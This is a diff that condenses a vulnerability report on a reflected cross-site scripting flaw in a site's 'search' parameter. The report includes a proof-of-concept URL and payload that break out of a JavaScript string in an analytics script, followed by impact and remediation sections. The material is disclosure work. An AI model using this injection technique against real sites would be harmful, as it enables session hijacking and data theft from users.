@@ -1,87 +1,60 @@
 ## Title
 
-Reflected Cross-Site Scripting (XSS) via `search` Parameter in Search Functionality
+Reflected Cross-Site Scripting (XSS) via `search` Parameter
 
----
 
 ## Vulnerability Type
 
 Reflected XSS
 
----
 
 ## Summary
 
-The `search` parameter used in the Help Center search functionality is reflected directly into a JavaScript context without proper sanitization or output encoding.
+The `search` parameter is reflected inside a JavaScript context without proper sanitization or output encoding, allowing arbitrary JavaScript execution in the victim’s browser.
 
-Because the application injects user-controlled input inside a `<script>` block, an attacker can break out of the intended string context and execute arbitrary JavaScript in the browser of any user who visits a crafted malicious URL.
+The issue occurs inside the analytics tracking script:
 
-The vulnerability specifically occurs inside the analytics tracking function:
-
-```javascript id="2it2bm"
+```javascript
 internalSearchTerm: ""+alert("xicorr55.php")+"",
 ```
 
-This confirms that user input is embedded directly into executable JavaScript code.
-
-<div align="center">
-
-### Screenshot 1 — Payload Reflected Inside JavaScript Context
-
-<img src="./xss-screenshots/55-Parm-inject.png" width="85%">
-
-<br><br>
-
-<em>User-controlled input reflected directly inside the JavaScript context without sanitization.</em>
-
-</div>
-
----
 
 ## Vulnerable Endpoint
 
-```http id="7k2t7x"
+```http
 https://kzlabs.com/55.php
 ```
 
 ### Vulnerable Parameter
 
-```http id="3rth4s"
+```http
 search
 ```
 
----
 
 ## Steps to Reproduce
 
-1. Open the following URL in a browser:
+1. Open the following URL:
 
-```http id="z2uskn"
+```http
 https://kzlabs.com/55.php?search=%22%2Balert(%22xicorr55.php%22)%2B%22
 ```
 
-2. Observe that a JavaScript alert box appears immediately when the page loads.
+2. Observe that a JavaScript alert executes on page load.
 
-3. View page source or inspect the DOM.
-
-4. Notice that the payload is reflected directly inside a JavaScript object without any sanitization.
-
-
----
 
 ## Payload Used
 
-```javascript id="zsjz5d"
+```javascript
 "+alert("xicorr55.php")+"
 ```
 
----
 
 ## Proof of Concept
 
-The application reflects the payload directly into the following script block:
+The payload is reflected directly into the following JavaScript code:
 
-```javascript id="1k7um5"
+```javascript
 window.onload = function(e) {
     Analytics.trackEvent('searchReturned', {
         internalSearchTerm: ""+alert("xicorr55.php")+"",
@@ -90,43 +63,26 @@ window.onload = function(e) {
 }
 ```
 
-Because the payload breaks out of the intended string context, arbitrary JavaScript executes successfully in the victim’s browser.
+### Screenshot — Alert Popup Triggered
 
-<div align="center">
+![Alert Popup](./xss-screenshots/55-alert-popup.png)
 
-### Screenshot 2 — Alert Popup Triggered
-
-<img src="./xss-screenshots/55-alert-popup.png" width="85%">
-
-<br><br>
-
-<em>Payload execution successfully triggers a JavaScript alert.</em>
-
-</div>
-
----
 
 ## Impact
 
-An attacker can craft a malicious URL that executes arbitrary JavaScript in the browser of any victim who visits the link.
+An attacker can exploit this vulnerability to:
 
-This may allow an attacker to:
+- Hijack authenticated user sessions
+- Potentially achieve account takeover
+- Perform unauthorized actions within the application
+- Exfiltrate sensitive user data
+- Execute arbitrary JavaScript in the victim’s browser context
 
-* Steal authenticated session tokens
-* Perform actions on behalf of users
-* Modify page content dynamically
-* Conduct phishing attacks using trusted application context
-* Target privileged or administrative users
 
-Since the payload executes automatically on page load, exploitation requires only that the victim opens the crafted URL.
+## Recommendations for Fix
 
----
-
-## Remediation
-
-* Never inject unsanitized user input directly into JavaScript contexts
-* Properly encode user-controlled data before rendering it inside `<script>` blocks
-* Use safe serialization methods such as `JSON.stringify()`
-* Implement contextual output encoding
-* Consider deploying a strict Content Security Policy (CSP) to reduce XSS impact
-* Validate and sanitize all incoming input server-side before processing or rendering it back to users
+- Properly sanitize and encode all user-controlled input before rendering it inside JavaScript contexts
+- Avoid directly embedding user input inside `<script>` blocks
+- Use safe serialization methods such as `JSON.stringify()`
+- Apply contextual output encoding (e.g., `htmlspecialchars()` in PHP where appropriate)
+- Implement a strict Content Security Policy (CSP) to reduce XSS impact
